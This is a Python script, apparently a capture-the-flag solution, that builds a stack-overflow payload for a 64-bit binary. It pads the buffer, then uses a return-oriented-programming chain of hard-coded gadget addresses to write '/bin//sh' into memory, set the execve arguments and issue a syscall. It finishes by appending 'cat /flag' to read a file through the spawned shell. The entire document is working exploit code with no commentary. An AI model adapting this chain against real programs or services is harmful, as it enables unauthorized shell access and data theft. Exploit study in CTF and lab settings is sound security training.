from struct import pack

# Padding goes here
p = 'a'*0x400

# saved ebp
p += 'abcdefgh'


p += pack('<Q', 0x00000000004101f3) # pop rsi ; ret
p += pack('<Q', 0x00000000006b90e0) # @ .data
p += pack('<Q', 0x0000000000415664) # pop rax ; ret
p += '/bin//sh'
p += pack('<Q', 0x000000000047f471) # mov qword ptr [rsi], rax ; ret
p += pack('<Q', 0x00000000004101f3) # pop rsi ; ret
p += pack('<Q', 0x00000000006b90e8) # @ .data + 8
p += pack('<Q', 0x0000000000444bc0) # xor rax, rax ; ret
p += pack('<Q', 0x000000000047f471) # mov qword ptr [rsi], rax ; ret
p += pack('<Q', 0x0000000000400686) # pop rdi ; ret
p += pack('<Q', 0x00000000006b90e0) # @ .data
p += pack('<Q', 0x00000000004101f3) # pop rsi ; ret
p += pack('<Q', 0x00000000006b90e8) # @ .data + 8
p += pack('<Q', 0x00000000004498b5) # pop rdx ; ret
p += pack('<Q', 0x00000000006b90e8) # @ .data + 8
p += pack('<Q', 0x0000000000444bc0) # xor rax, rax ; ret
p += pack('<Q', 0x00000000004748c0) # add rax, 1 ; ret
p += pack('<Q', 0x00000000004748c0) # add rax, 1 ; ret
p += pack('<Q', 0x00000000004748c0) # add rax, 1 ; ret
p += pack('<Q', 0x00000000004748c0) # add rax, 1 ; ret
p += pack('<Q', 0x00000000004748c0) # add rax, 1 ; ret
p += pack('<Q', 0x00000000004748c0) # add rax, 1 ; ret
p += pack('<Q', 0x00000000004748c0) # add rax, 1 ; ret
p += pack('<Q', 0x00000000004748c0) # add rax, 1 ; ret
p += pack('<Q', 0x00000000004748c0) # add rax, 1 ; ret
p += pack('<Q', 0x00000000004748c0) # add rax, 1 ; ret
p += pack('<Q', 0x00000000004748c0) # add rax, 1 ; ret
p += pack('<Q', 0x00000000004748c0) # add rax, 1 ; ret
p += pack('<Q', 0x00000000004748c0) # add rax, 1 ; ret
p += pack('<Q', 0x00000000004748c0) # add rax, 1 ; ret
p += pack('<Q', 0x00000000004748c0) # add rax, 1 ; ret
p += pack('<Q', 0x00000000004748c0) # add rax, 1 ; ret
p += pack('<Q', 0x00000000004748c0) # add rax, 1 ; ret
p += pack('<Q', 0x00000000004748c0) # add rax, 1 ; ret
p += pack('<Q', 0x00000000004748c0) # add rax, 1 ; ret
p += pack('<Q', 0x00000000004748c0) # add rax, 1 ; ret
p += pack('<Q', 0x00000000004748c0) # add rax, 1 ; ret
p += pack('<Q', 0x00000000004748c0) # add rax, 1 ; ret
p += pack('<Q', 0x00000000004748c0) # add rax, 1 ; ret
p += pack('<Q', 0x00000000004748c0) # add rax, 1 ; ret
p += pack('<Q', 0x00000000004748c0) # add rax, 1 ; ret
p += pack('<Q', 0x00000000004748c0) # add rax, 1 ; ret
p += pack('<Q', 0x00000000004748c0) # add rax, 1 ; ret
p += pack('<Q', 0x00000000004748c0) # add rax, 1 ; ret
p += pack('<Q', 0x00000000004748c0) # add rax, 1 ; ret
p += pack('<Q', 0x00000000004748c0) # add rax, 1 ; ret
p += pack('<Q', 0x00000000004748c0) # add rax, 1 ; ret
p += pack('<Q', 0x00000000004748c0) # add rax, 1 ; ret
p += pack('<Q', 0x00000000004748c0) # add rax, 1 ; ret
p += pack('<Q', 0x00000000004748c0) # add rax, 1 ; ret
p += pack('<Q', 0x00000000004748c0) # add rax, 1 ; ret
p += pack('<Q', 0x00000000004748c0) # add rax, 1 ; ret
p += pack('<Q', 0x00000000004748c0) # add rax, 1 ; ret
p += pack('<Q', 0x00000000004748c0) # add rax, 1 ; ret
p += pack('<Q', 0x00000000004748c0) # add rax, 1 ; ret
p += pack('<Q', 0x00000000004748c0) # add rax, 1 ; ret
p += pack('<Q', 0x00000000004748c0) # add rax, 1 ; ret
p += pack('<Q', 0x00000000004748c0) # add rax, 1 ; ret
p += pack('<Q', 0x00000000004748c0) # add rax, 1 ; ret
p += pack('<Q', 0x00000000004748c0) # add rax, 1 ; ret
p += pack('<Q', 0x00000000004748c0) # add rax, 1 ; ret
p += pack('<Q', 0x00000000004748c0) # add rax, 1 ; ret
p += pack('<Q', 0x00000000004748c0) # add rax, 1 ; ret
p += pack('<Q', 0x00000000004748c0) # add rax, 1 ; ret
p += pack('<Q', 0x00000000004748c0) # add rax, 1 ; ret
p += pack('<Q', 0x00000000004748c0) # add rax, 1 ; ret
p += pack('<Q', 0x00000000004748c0) # add rax, 1 ; ret
p += pack('<Q', 0x00000000004748c0) # add rax, 1 ; ret
p += pack('<Q', 0x00000000004748c0) # add rax, 1 ; ret
p += pack('<Q', 0x00000000004748c0) # add rax, 1 ; ret
p += pack('<Q', 0x00000000004748c0) # add rax, 1 ; ret
p += pack('<Q', 0x00000000004748c0) # add rax, 1 ; ret
p += pack('<Q', 0x00000000004748c0) # add rax, 1 ; ret
p += pack('<Q', 0x00000000004748c0) # add rax, 1 ; ret
p += pack('<Q', 0x00000000004748c0) # add rax, 1 ; ret
p += pack('<Q', 0x000000000040129c) # syscall

p += 'D' * (2000 - len(p))

p += "cat /flag\n"

print(p)
